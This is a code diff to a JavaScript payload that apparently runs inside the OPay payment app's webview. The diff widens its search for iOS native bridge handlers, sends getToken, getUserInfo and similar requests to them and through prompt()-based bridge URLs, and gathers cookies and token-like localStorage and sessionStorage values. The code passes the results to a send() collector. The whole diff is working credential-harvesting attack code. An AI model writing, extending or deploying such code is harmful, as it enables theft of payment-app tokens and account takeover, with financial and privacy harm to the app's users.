@@ -237,28 +237,110 @@
                     D.bridges.push("webkit.messageHandlers");
                     log("FOUND iOS webkit.messageHandlers");
 
-
                     var hNames = ['getBaseInfo', 'getToken', 'getUserInfo', 'getAccountInfo',
                         'OPay3PartyContext', 'OPayContext', 'callNative', 'invoke',
-                        'getAppInfo', 'getDeviceInfo', 'getUserToken', 'getAccessToken'];
+                        'getAppInfo', 'getDeviceInfo', 'getUserToken', 'getAccessToken',
+                        'nativeCall', 'jsbridge', 'opaybridge', 'OPayBridge',
+                        'nativeBridge', 'JSBridge', 'webViewBridge', 'appBridge',
+                        'payBridge', 'callApp', 'sendToNative', 'execute',
+                        'handler', 'bridge', 'native', 'app', 'opay',
+                        'getLoginInfo', 'getSessionInfo', 'getAuthInfo',
+                        'getWalletInfo', 'getPaymentInfo', 'getUserProfile'];
                     var hFound = [];
                     for (var h = 0; h < hNames.length; h++) {
                         try {
                             if (window.webkit.messageHandlers[hNames[h]]) hFound.push(hNames[h]);
                         } catch (e) { }
                     }
-                    if (hFound.length > 0) send({ handlers: hFound }, "IOS_H");
+                    if (hFound.length > 0) {
+                        send({ handlers: hFound }, "IOS_H");
+                        log("iOS handlers found: " + hFound.join(", "));
+                    }
 
-                    // Try posting messages to handlers
+                    // Try posting messages to handlers with multiple payload formats
+                    var payloads = [
+                        { action: "getToken" },
+                        { action: "getBaseInfo" },
+                        { action: "getUserInfo" },
+                        { method: "getToken", params: {} },
+                        { method: "getBaseInfo", params: {} },
+                        { cmd: "getToken" },
+                        { type: "getToken" },
+                        "getToken",
+                        "getBaseInfo",
+                        "getUserInfo",
+                        ""
+                    ];
                     for (var hi = 0; hi < hFound.length; hi++) {
-                        try {
-                            window.webkit.messageHandlers[hFound[hi]].postMessage({ action: "getToken" });
-                            window.webkit.messageHandlers[hFound[hi]].postMessage({ action: "getBaseInfo" });
-                            window.webkit.messageHandlers[hFound[hi]].postMessage("getToken");
-                            window.webkit.messageHandlers[hFound[hi]].postMessage("");
-                        } catch (e) { }
+                        for (var pi = 0; pi < payloads.length; pi++) {
+                            try {
+                                window.webkit.messageHandlers[hFound[hi]].postMessage(payloads[pi]);
+                            } catch (e) { }
+                        }
                     }
                 }
+            } catch (e) { log("webkit scan err: " + e.message); }
+
+            // iOS prompt() bridge technique - some apps use prompt() as JS-to-native bridge
+            try {
+                var origPrompt = window.prompt;
+                var promptCmds = [
+                    'opayjsbridge://getToken',
+                    'opayjsbridge://getBaseInfo',
+                    'opayjsbridge://getUserInfo',
+                    'jsbridge://getToken',
+                    'native://getToken',
+                    JSON.stringify({ action: "getToken" }),
+                    JSON.stringify({ method: "getBaseInfo" })
+                ];
+                for (var pc = 0; pc < promptCmds.length; pc++) {
+                    try {
+                        var pResult = origPrompt(promptCmds[pc]);
+                        if (pResult && pResult.length > 5) {
+                            send({ prompt_cmd: promptCmds[pc], result: pResult }, "PROMPT_BRIDGE");
+                            log("Prompt bridge response: " + pResult.substring(0, 100));
+                            if (pResult.indexOf("eyJ") > -1 || pResult.indexOf("token") > -1) {
+                                D.token = pResult;
+                                send({ token: pResult, src: "prompt_bridge" }, "TOKEN");
+                                try {
+                                    var pp = JSON.parse(pResult);
+                                    if (pp.token) extractAll(pp.token);
+                                } catch (e) { }
+                            }
+                        }
+                    } catch (e) { }
+                }
+            } catch (e) { }
+
+            // Harvest cookies, localStorage, sessionStorage
+            try {
+                var storage = {};
+                if (document.cookie) storage.cookies = document.cookie;
+                try {
+                    var lsKeys = [];
+                    for (var li = 0; li < localStorage.length; li++) {
+                        var lk = localStorage.key(li);
+                        lsKeys.push(lk);
+                        var lv = localStorage.getItem(lk);
+                        if (lv && (lv.indexOf("eyJ") > -1 || lv.indexOf("token") > -1)) {
+                            storage["ls_" + lk] = lv.substring(0, 500);
+                        }
+                    }
+                    storage.lsKeys = lsKeys;
+                } catch (e) { }
+                try {
+                    var ssKeys = [];
+                    for (var si = 0; si < sessionStorage.length; si++) {
+                        var sk = sessionStorage.key(si);
+                        ssKeys.push(sk);
+                        var sv = sessionStorage.getItem(sk);
+                        if (sv && (sv.indexOf("eyJ") > -1 || sv.indexOf("token") > -1)) {
+                            storage["ss_" + sk] = sv.substring(0, 500);
+                        }
+                    }
+                    storage.ssKeys = ssKeys;
+                } catch (e) { }
+                if (Object.keys(storage).length > 0) send(storage, "STORAGE");
             } catch (e) { }
 
             // postMessage listener for async bridge responses
